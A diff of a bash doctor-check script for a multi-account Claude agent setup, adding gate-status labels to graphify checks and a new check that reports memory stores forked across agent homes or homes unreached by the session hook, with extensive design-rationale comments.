+  # cannot drift apart in silence.
+  local gfx_gate=", gate on"
+  [ ! -e "$HOME/.ccrc/graph-gate-off" ] \
+    || gfx_gate=", gate off (operator file \$HOME/.ccrc/graph-gate-off)"
 
   local -a gfx_install_fail=() gfx_excludes_warn=()
   local -a gfx_census_fail=() gfx_census_warn=() gfx_disk_fail=() gfx_disk_warn=() gfx_disk_unread_warn=()
@@ -3038,27 +3562,27 @@ _check_graphify() {
   # ── the verdict, one line per bucket that has something to say ───────────
   local rc=0
   if [ "${#gfx_install_fail[@]}" -gt 0 ]; then
-    _dr_fail graphify "$(_dr_join "${gfx_install_fail[@]}")" \
+    _dr_fail graphify "$(_dr_join "${gfx_install_fail[@]}")$gfx_gate" \
       "run: ccrc install — it provisions the engine venv, stamps the pin, and converges every rostered home's skill"
     rc=1
   fi
   if [ "${#gfx_census_fail[@]}" -gt 0 ]; then
-    _dr_fail graphify "$(_dr_join "${gfx_census_fail[@]}")" \
+    _dr_fail graphify "$(_dr_join "${gfx_census_fail[@]}")$gfx_gate" \
       "read \$HOME/.ccrc/graph-sweep.log for what the pass hit, and check the timer: systemctl --user status ccd-graph-sweep.timer"
     rc=1
   fi
   if [ "${#gfx_disk_fail[@]}" -gt 0 ]; then
-    _dr_fail graphify "$(_dr_join "${gfx_disk_fail[@]}")" \
+    _dr_fail graphify "$(_dr_join "${gfx_disk_fail[@]}")$gfx_gate" \
       "free space on that filesystem before the next sweep pass — under 2 GiB a graph build fails the same way a ccd clone does"
     rc=1
   fi
   if [ "${#gfx_excludes_warn[@]}" -gt 0 ]; then
-    _dr_warn graphify "$(_dr_join "${gfx_excludes_warn[@]}")" \
+    _dr_warn graphify "$(_dr_join "${gfx_excludes_warn[@]}")$gfx_gate" \
       "run: ccrc install — it writes the graphify-out/ exclude into every tree the sweep walks"
     [ "$rc" -eq 1 ] || rc=2
   fi
   if [ "${#gfx_census_warn[@]}" -gt 0 ]; then
-    _dr_warn graphify "$(_dr_join "${gfx_census_warn[@]}")" \
+    _dr_warn graphify "$(_dr_join "${gfx_census_warn[@]}")$gfx_gate" \
       "check the timer: systemctl --user status ccd-graph-sweep.timer (and journalctl --user -u ccd-graph-sweep.service -n 20)"
     [ "$rc" -eq 1 ] || rc=2
   fi
@@ -3067,12 +3591,12 @@ _check_graphify() {
     # TIMER (is the sweep still firing), and `systemctl status` answers nothing
     # here — these rows are per-repository work. No verb prints the census, so
     # the remedy names the file itself rather than inventing one.
-    _dr_warn graphify "$(_dr_join "${gfx_rows_warn[@]}")" \
+    _dr_warn graphify "$(_dr_join "${gfx_rows_warn[@]}")$gfx_gate" \
       "read the rows — each carries its own reason — in \$HOME/.ccrc/graph-sweep.json (.passes[-1].trees[]); a refused tree keeps its last graph and builds again as soon as its corpus is clean"
     [ "$rc" -eq 1 ] || rc=2
   fi
   if [ "${#gfx_disk_warn[@]}" -gt 0 ]; then
-    _dr_warn graphify "$(_dr_join "${gfx_disk_warn[@]}")" \
+    _dr_warn graphify "$(_dr_join "${gfx_disk_warn[@]}")$gfx_gate" \
       "clear room on that filesystem while it is still cheap"
     [ "$rc" -eq 1 ] || rc=2
   fi
@@ -3080,14 +3604,14 @@ _check_graphify() {
     # Its own bucket, its own remedy: "clear room" (the bucket above) fixes
     # nothing here — this is "the measurement could not be taken at all",
     # `_check_disk`'s own remedy wording for the identical shape, adapted.
-    _dr_warn graphify "$(_dr_join "${gfx_disk_unread_warn[@]}")" \
+    _dr_warn graphify "$(_dr_join "${gfx_disk_unread_warn[@]}")$gfx_gate" \
       "check by hand: df -Pk <the root named above> — a filesystem df cannot stat answers exactly this way; install df first if it is not on PATH (coreutils on a GNU box, util-linux on some minimal images)"
     [ "$rc" -eq 1 ] || rc=2
   fi
   if [ "$rc" -ne 0 ]; then
     return "$rc"
   fi
-  _dr_pass graphify "engine $pin, skills converged, census ok"
+  _dr_pass graphify "engine $pin, skills converged, census ok$gfx_gate"
 }
 
 # ── graphify-path: what a session runs when it types `graphify` (R3) ──────
@@ -3371,6 +3895,18 @@ _check_build() {
 # file produce the same digest and report `'agreed'` (measured on this plan's
 # own Task 6 fix). The PASS therefore claims exactly what was measured, and the
 # thing that catches the rest is the `wrappers` check above, run on each box.
+#
+# WHAT THE DIGEST NOW COVERS, and what it still does not. `pool` IS covered:
+# `shared/generate.mjs` emits `_ccrc_pool()` into `accounts.sh` always — an
+# empty `case` when nothing is tagged — precisely so a pool disagreement
+# between the two boxes changes the bytes and reads as `divergent` here, with
+# this check's existing remedy. `hidden` is NOT covered, and joins `exec.kind`
+# and `secretsFile` in the same disclosure: the generator emits none of the
+# three, so two rosters differing only in a `hidden` flag produce the same
+# digest and report `'agreed'`. Expect a TRANSIENT `divergent` during any
+# agent-first deploy that adds or changes pools — the roster lane lands on one
+# box before the other, the deploy output says so, and it clears when the
+# second lane runs.
 _check_fleet() {
   # THE READERS LIVE IN `ccrc`, NOT HERE, and that is not an accident of where
   # the code was typed: `ccrc status` makes the same call, and a copy of an
@@ -3535,4 +4071,247 @@ _check_fleet() {
     return "$rc"
   fi
   _dr_pass fleet "the two boxes agree — same build, and the same generated ~/.ccrc/accounts.sh (measured by the server at $addr, in remote mode, connected)"
+}
+
+# ── memory convergence ────────────────────────────────────────────────────
+# THE WHOLE DEFECT EXISTED BECAUSE A FORK IS SILENT. Nothing on this box
+# reported that two homes disagreed about a project's memory, so a session read
+# its own superseded record after an account swap and acted on it. A
+# convergence mechanism without a detector only moves the silence one layer
+# down: the next unconverged home forks exactly as `.claude-dev0` did.
+#
+# HOMES COME FROM THE FILESYSTEM, NOT THE ROSTER. `.claude-glm` and
+# `.claude-kimi` are on disk, hold memory, and are in no roster entry — a
+# roster-driven check would report PASS while the homes most likely to fork
+# went unexamined.
+#
+# THE GLOB ITSELF IS STILL A NARROWER PROMISE THAN "every agent home", AND
+# THAT IS A DOCUMENTED LIMIT, NOT FIXED HERE (whole-branch review, Important).
+# It is `"$HOME"/.claude*/`, so a config dir whose suffix does not start with
+# `.claude` — legal by `shared/roster.ts`'s own validator
+# (`/^\.[A-Za-z0-9._-]+$/`, whose own error text suggests `.${id}`, e.g.
+# `.kimi` for account id "kimi") — is invisible to this check exactly as it is
+# invisible to `_mem_homes` (ccd/ccrc), while the hook
+# (`_hook_memory_converge`) takes the home from the transcript path with no
+# name filter at all and WOULD converge such a home regardless. Left alone
+# deliberately: `_mem_homes` and the hook are owned by other work in this same
+# review wave, and widening only THIS copy's glob (say, by reading
+# `~/.ccrc/accounts.json` for `configDirSuffix`, which no other enumerator
+# does) would make doctor report — and hand a `ccrc memory --apply` remedy
+# for — a home the census and `--apply` still cannot see or migrate, which is
+# a worse lie than today's shared blind spot. A real fix has to land in
+# `_mem_homes`, this check and the hook together (D-2181's four-site parity),
+# or not at all.
+#
+# THREE CONDITIONS, NEVER TWO. "Forked" and "unreachable" have different
+# remedies: the first is `ccrc memory --apply`, the second is wiring the home
+# into `install-session-hooks.sh` (whose list is built from CCRC_ACCOUNTS, which
+# is why a non-rostered home can never be hooked). Collapsing them sends the
+# operator to the wrong fix. Since R33 they also carry different SEVERITIES —
+# forked is a WARN, unreachable stays a FAIL — because a fork is the expected
+# state of every multi-home box before its one-time migration, while an
+# unreachable home is a misconfiguration nothing will ever repair on its own.
+# See the WARN/FAIL calls at the bottom of this function for the full
+# reasoning.
+#
+# THIS RE-DERIVES `_mem_homes`/`_mem_state` (ccrc's own memory functions)
+# RATHER THAN SOURCING THEM — DELIBERATELY (D-92). `cmd_doctor` happens to
+# source this file into the same shell where `ccrc` already defines those two
+# functions, so calling them would technically work today. But this file is
+# ALSO sourced standalone, under `set -u`, by callers that are not `ccrc`
+# (this suite's own test harness does exactly that to read
+# `CCRC_DOCTOR_CHECKS`), and D-92 (ccd/ccrc:971-981, pinned by
+# ccrc-install.test.ts:2547-2556) is this repo's standing ruling that
+# ccrc-doctor-checks must hold its own second spelling of anything it needs,
+# rather than lean on a scope accident. Don't "fix" this duplication by
+# reaching across a boundary that does not reliably exist.
+#
+# THE HOME GLOB ON A BOX WITH NO `.claude*` AT ALL: this check does not set
+# nullglob itself, so `"$HOME"/.claude*/` expands to its own literal text
+# when nothing matches — `_check_wrappers`, elsewhere in this file, toggles
+# `shopt -s nullglob` on and restores it before returning (`:2410`/`:2420`),
+# but that toggle lives and dies inside `_check_wrappers`' own subshell
+# (`cmd_doctor` runs every check as `out="$( "_check_$name" )"`), so it can
+# never leak into this one. The `[ -d "${h}projects" ]` guard right below is
+# what makes an unmatched literal glob harmless either way — it is never a
+# directory, so the loop body simply never runs and this check PASSes having
+# measured a box with no agent homes at all. That PASS is vacuous, not a
+# lie: there is nothing here that could have forked.
+#
+# EXTERNAL BINARIES ARE NOT BANNED HERE — `_check_caddyfile` calls `readlink`
+# (`:1720`) and `_check_graphify-path` calls `realpath` twice (`:3575`-
+# `:3576`), so "this file never shells out" would overstate its own practice.
+# The real doctrine is D-1350 (`:3555`-`:3572`): a tool is fine to use, but
+# its ABSENCE must become an unmeasured/SKIP outcome, never a narrowed or
+# wrong verdict — an adapter may not narrow a distinction it received. This
+# check still avoids `basename`/`readlink`/`grep` (below), but for a sharper
+# reason than house style: this check's OWN test harness
+# (`ccrc-doctor.test.ts`'s `doctorEnv`) runs every check against a PATH of
+# only its own stub binaries, and unlike `stat`/`date`/`timeout`/`jq` (which
+# `healthy()` explicitly links in), none of those three are ever linked —
+# measured, they resolve to nothing there. Reaching for them would need this
+# check to ALSO grow the SKIP/unmeasured handling D-1350 requires; writing it
+# in bash builtins sidesteps needing that machinery at all:
+# `${x%/}` then `${x##*/}` is `basename` in pure parameter expansion (the
+# same idiom `_check_wrappers` already uses at `name="${f##*/}"`), and the
+# settings.json scan below is a `read` loop rather than `grep`.
+#
+# CONVERGED MEANS THE LINK RESOLVES TO THE STORE *AND THE STORE IS A
+# DIRECTORY* (R20, Task 4 review round 2 — see `_mem_state` in `ccd/ccrc` for
+# the full ruling this mirrors). `[ "$link" -ef "$store" ]` alone answers only
+# "resolves to something that exists" — it is TRUE for a link resolving to a
+# regular FILE sitting where the store belongs, which is just as unusable a
+# memory store as a dangling link but LOOKS nothing like one. Round 2's
+# review measured this exact gap: `_check_memory` PASSed a box whose "store"
+# was `: > $HOME/.ccrc/memory/<slug>`, a plain file. `[ -d "$store" ]` is
+# therefore a SECOND, INDEPENDENT conjunct, not implied by `-ef` — deleting it
+# alone (leaving `-ef` in place) reproduces exactly that false PASS. `-ef`
+# still does the other half of the job for free: it compares device+inode
+# THROUGH the symlink (the same operator `_check_wrappers` already uses for
+# its own alias detection), so a RELATIVE link that genuinely resolves to the
+# store reads as converged without any `readlink` at all — a bare dangling
+# link (nothing to stat on either side) or a link naming a different file
+# both fail `-ef` on that fact alone.
+#
+# `[ -e "$link" ] || [ -L "$link" ] || continue`, NOT `[ -e "$link" ] ||
+# continue`: `-e` DEREFERENCES, so it is false for a dangling symlink —
+# exactly the pair the rule above calls forked, because its target text is
+# right but nothing is behind it. Skipping past it here would let doctor PASS
+# a box the census (`ccrc memory`) calls forked (R10 — the same defect Task 2
+# and Task 3 each hit once already on this branch).
+#
+# THREE SETTINGS.JSON SHAPES, NOT TWO (R22 + a Minor, Task 4 review round 2).
+# `install-session-hooks.sh:107-115` writes `cur='{}'` and proceeds to insert
+# the hook for ANY rostered home that has no settings.json at all — so a
+# missing file is not "nothing to report", it is proof the installer has
+# never touched this home, the MAXIMAL case of "will fork on first use".
+# Round 1 of this check only ever examined a settings.json that existed,
+# which silently PASSed exactly the home most likely to fork (measured:
+# `.claude-kimi/projects/` with no settings.json at all read as converged).
+# The third shape is a settings.json that EXISTS but cannot be READ (mode
+# problem, not a content problem): folding that into "unreachable" would be
+# the overloaded-null defect this codebase bans by name yet again — D-1350's
+# "an adapter may not narrow a distinction it received" applies here just as
+# it does to a missing `realpath`. "I could not read it" and "it is
+# definitely not wired" are different facts an operator fixes differently
+# (a permissions fix vs. a roster/settings.json edit), so an unreadable file
+# earns its own WARN, `unmeasured`, with its own remedy — never silently
+# promoted to the FAIL a confirmed-absent hook gets. `[ -r "${h}settings.json" ]`
+# is checked BEFORE ever opening the file for exactly this reason too: a
+# `while read … done < file` whose open() fails leaks bash's own permission-
+# denied diagnostic to the REAL stderr (redirections are set up left to right,
+# so a trailing `2>/dev/null` on that same line cannot catch the failure of
+# the `<` that precedes it) — refusing to attempt the open at all is simpler
+# than getting that ordering right, and it is what makes the WARN path clean.
+#
+# R21 (Task 4 review round 2): a box can be forked AND carry an unreachable
+# home AND carry an unmeasured one, all at once, and this check now answers
+# in all three classes rather than picking the loudest and discarding the
+# rest — `ccrc-doctor-checks`'s own header rules exactly this ("ONE CHECK MAY
+# ANSWER IN TWO (OR MORE) CLASSES": distinct findings are distinct operator
+# actions, so each gets its own line and its own remedy). The instruction
+# that shipped round 1's early-return ("emit exactly one verdict line or
+# doctor's tallies go inconsistent") was wrong: `cmd_doctor` counts VERDICT
+# LINES, not a fixed arity per check — the counting loop and the comment that
+# rules it are `ccd/ccrc:1990`-`:2007`, and the contract the count then has to
+# satisfy (the return code must be the WORST class the check printed, or the
+# check is failed as a ccrc bug) is `ccd/ccrc:2048`-`:2063` — so a fork on one
+# home and an unreachable finding on an unrelated home are computed
+# independently below and BOTH printed — dropping either one is silence about
+# a real finding, which is the one thing this whole task exists not to do.
+# SINCE R33 THE TWO ARE NO LONGER BOTH FAIL: a forked-and-unreachable box now
+# prints one WARN line and one FAIL line, and the worst-class cross-check at
+# `ccd/ccrc:2048`-`:2063` still picks FAIL as the return code — `unreachable`
+# alone is what can still fail `ccrc update`.
+#
+# NO `.claude-docserver` SPECIAL CASE, DELIBERATELY (Minor, whole-branch
+# review round 3 — reached independently of `_mem_homes`'s identical guard in
+# ccd/ccrc, which is owned by other work in this wave, but for the same
+# reason). It used to be excluded by name in this loop. Removed because (a)
+# hard-coding one operator's box-local tool's directory name into shipped,
+# public-release-bound source is exactly the residue class the top-level
+# CLAUDE.md bans by name ("no account-name list in ANY shipped source file"),
+# and this tree is not supposed to know `.claude-docserver` exists at all —
+# it is "operator plumbing this tree does not know about", the same phrase
+# that CLAUDE.md uses to keep Tailscale out of this codebase; (b) it excluded
+# nothing measurable: `~/.claude-docserver` carries no `projects/` directory
+# on the box it was written for, so the very next line
+# (`[ -d "${h}projects" ] || continue`) already skips it. If some future box's
+# docserver ever does grow a `projects/` directory, treating it like any other
+# `.claude*` directory is the right answer — a silent blind spot for a name
+# this tool has no business knowing is worse than one more row in the census.
+_check_memory() {
+  local h b d slug link store forked="" unreachable="" unmeasured="" line hooked rc=0
+  for h in "$HOME"/.claude*/; do
+    b="${h%/}"; b="${b##*/}"
+    [ -d "${h}projects" ] || continue
+    if [ ! -f "${h}settings.json" ]; then
+      # R22: never touched by install-session-hooks.sh — the maximal case of
+      # "will fork on first use".
+      unreachable="${unreachable:+$unreachable }$b"
+    elif [ -r "${h}settings.json" ]; then
+      hooked=0
+      while IFS= read -r line || [ -n "$line" ]; do
+        case "$line" in *session-hook.sh*) hooked=1; break ;; esac
+      done < "${h}settings.json"
+      [ "$hooked" -eq 1 ] || unreachable="${unreachable:+$unreachable }$b"
+    else
+      unmeasured="${unmeasured:+$unmeasured }$b"
+    fi
+    for d in "${h}projects"/*/; do
+      [ -d "$d" ] || continue
+      slug="${d%/}"; slug="${slug##*/}"
+      # THE PATTERN LIST IS SPELLED HERE, and that is D-92's trade rather
+      # than an oversight — the same one this file already records for `ccd`'s
+      # `POOL_NAME_RE`: this table is sourced under `set -u` by things that are
+      # NOT `ccrc` (`ccrc-doctor.test.ts`'s `tableNames()`), so it cannot reach
+      # `_mem_is_scratch`, and a `declare -F` guard would be the second
+      # spelling with a branch in front of it. `single-definition.test.ts`
+      # compares all three literals and reds on a drift. `_mem_is_scratch` in
+      # `ccrc` carries the rule and the measurement (D-2375).
+      case "$slug" in -tmp*|-private-tmp*|-var-folders*|-private-var-folders*) continue ;; esac
+      link="${d}memory"
+      [ -e "$link" ] || [ -L "$link" ] || continue
+      store="$HOME/.ccrc/memory/$slug"
+      [ "$link" -ef "$store" ] && [ -d "$store" ] && continue
+      forked="${forked:+$forked }$b:$slug"
+    done
+  done
+  if [ -n "$forked" ]; then
+    # R33 (controller ruling — implemented, not relitigated): WARN, not FAIL.
+    # `cmd_install` ends with `cmd_doctor` in both role arms, and `cmd_doctor`
+    # returns 1 the moment any check FAILs, so a FAIL here hard-dies
+    # `cmd_update` (`_ccrc_die`) BEFORE `_upd_sweep` ever runs — the fleet's
+    # ~20 `claude-session@*` supervisors keep running the OLD ccd while the
+    # operator reads a message naming doctor, never the sweep it silently
+    # skipped. And this check FAILs on `forked` BY CONSTRUCTION on every box
+    # that has ever run more than one agent home, until the operator runs the
+    # one irreversible `ccrc memory --apply` — so an unrelated verb (`ccrc
+    # update`) was coercing operators into that migration to make itself
+    # succeed. `unreachable` below is not the same kind of finding and stays
+    # FAIL: a fork is the expected PRE-MIGRATION state of every multi-home
+    # box, but an unreachable home is a misconfiguration nothing will ever
+    # repair on its own. The three conditions this check answers in are still
+    # never collapsed to two — they now carry two severities instead of one,
+    # which is what the difference in their remedies actually means. A WARN
+    # still prints with its own remedy, and `cmd_doctor` still counts it —
+    # it just cannot fail `ccrc update`.
+    _dr_warn memory "memory is forked across agent homes: $forked" \
+      "one store per project: run \`ccrc memory\` to see the census, then \`ccrc memory --apply\`"
+    [ "$rc" -eq 1 ] || rc=2
+  fi
+  if [ -n "$unreachable" ]; then
+    _dr_fail memory "agent homes the session hook cannot reach, so they will fork on first use: $unreachable" \
+      "add the account to the roster so install-session-hooks.sh wires it, or register session-hook.sh in that home's settings.json by hand"
+    rc=1
+  fi
+  if [ -n "$unmeasured" ]; then
+    _dr_warn memory "could not tell whether the session hook reaches every agent home — settings.json exists but could not be read for: $unmeasured" \
+      "fix its permissions so doctor can read it (chmod u+r <home>/settings.json), or check by hand whether it references session-hook.sh"
+    [ "$rc" -eq 1 ] || rc=2
+  fi
+  if [ "$rc" -eq 0 ]; then
+    _dr_pass memory "one memory store per project; every agent home converged"
+  fi
+  return "$rc"
 }
